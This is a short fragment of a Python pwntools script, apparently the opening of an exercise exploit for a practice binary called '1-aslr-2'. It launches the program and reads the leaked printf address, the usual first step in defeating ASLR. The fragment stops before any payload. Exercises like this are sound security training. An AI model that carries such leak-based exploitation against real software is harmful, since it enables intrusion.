#this is the format of the output of the program:
#No buffer address, but I will let you know the address of printf 0xf7d74520
#i need to just grab the address right after printf

from pwn import *
context.arch = "i386"

p = process("./1-aslr-2")

p.recvuntil("printf: ")
